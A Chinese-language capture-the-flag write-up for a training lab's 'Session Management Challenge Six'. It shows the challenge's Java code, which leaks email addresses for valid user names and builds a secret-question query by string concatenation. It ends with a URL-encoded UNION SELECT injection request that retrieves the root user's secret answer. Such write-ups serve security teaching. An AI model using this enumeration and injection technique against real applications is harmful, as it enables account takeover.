# Session Management Challenge Six(会话管理 6) 

## 题介绍
需要获得管理员权限  


## 功能实现 
请求数据包  
```

POST /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316ece HTTP/1.1

Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293

subName=root&subPassword=test
```


用户名必须正确，才能获得邮箱地址,代码如下    

```
subPass = subPass.replaceAll("!", "");
						
callstmt = conn.prepareStatement("SELECT userName, userAddress FROM users WHERE userName = ? AND userPassword = SHA(?)");
callstmt.setString(1, subName);
callstmt.setString(2, subPass);
log.debug("Executing authUser");
ResultSet resultSet = callstmt.executeQuery();
if(resultSet.next())
{
	//This should never happen. But just in case;
	log.debug("Successful Login");
	// Get key and add it to the output
	String userKey = Hash.generateUserSolution(Getter.getModuleResultFromHash(ApplicationRoot, levelHash), (String)ses.getAttribute("userName"));
	htmlOutput = "<h2 class='title'>" + bundle.getString("response.welcome") + " " + Encode.forHtml(resultSet.getString(1)) + "</h2>" +
			"<p>" +
			bundle.getString("response.resultKey") + " <a>" + userKey + "</a>" +
			"</p>";
}
else
{
	log.debug("Incorrect credentials, checking if user name correct");
	callstmt = conn.prepareStatement("SELECT userAddress FROM users WHERE userName = ?"); //判断用户名是否存在 返回邮箱地址 
	callstmt.setString(1, subName);
	log.debug("Executing getAddress");
	resultSet = callstmt.executeQuery();
	if(resultSet.next())
	{
		log.debug("User Found");
		userAddress = "" + bundle.getString("response.badPass") + " <a>" + Encode.forHtml(resultSet.getString(1)) + "</a><br/>";
	}
	else
	{
		userAddress = "" + bundle.getString("response.badUser") + "<br/>";
	}
	htmlOutput = makeTable(userAddress, bundle);
}

```

邮箱验证 请求   

```
GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=test HTTP/1.1

Cookie: current=WjNWbGMzUXhNZz09; SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; securityMisconfigLesson=8a3a691885e0014f25a930658c371cc376d7b2734953a536c0f834e318a6ece9; currentPerson=YUd1ZXN0; ac=ZG9Ob3RSZXR1cm5BbnN3ZXJz; JSESSIONID=97FD1A94D1A96ACD1BB31BFB000F40D8; token=50163458658349300026575546979087684293
```
存在SQL注入   

```
Object emailObj = request.getParameter("subEmail");
String subEmail = Validate.validateParameter(emailObj, 75);
log.debug("subEmail = " + subEmail);

String ApplicationRoot = getServletContext().getRealPath("");
try
{
	if(subEmail.length() < 10)
	{
		log.debug("Invalid data submitted");
		htmlOutput = new String("<b>" + bundle.getString("question.invalidData") + ": </b>" + bundle.getString("question.invalidEmail"));
	}
	else
	{
		Connection conn = Database.getChallengeConnection(ApplicationRoot, "BrokenAuthAndSessMangChalSix");
		log.debug("Getting Secret Question");
		PreparedStatement callstmt = conn.prepareStatement("SELECT secretQuestion FROM users WHERE userAddress = \"" + subEmail +"\"");  //存在SQL注入
		ResultSet rs = callstmt.executeQuery();
		if(rs.next())
		{
			log.debug("'Valid' User Detected");
			log.debug("Encoding for output: " + rs.getString(1));
			//rs.getString(1) contains the question for the user to answer. This question is asked in English as it must be answered in English to successfully pass the level
			htmlOutput = new String(Encode.forHtml(rs.getString(1)));
		}

```


## 解题步骤  
获得答案

```
GET /challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion?subEmail=%22%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%73%65%63%72%65%74%41%6e%73%77%65%72%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%4e%61%6d%65%3d%22%72%6f%6f%74 HTTP/1.1
 
```

提交即可 

## 总结  

基础安全问题，需要彻底解决，否则会被综合利用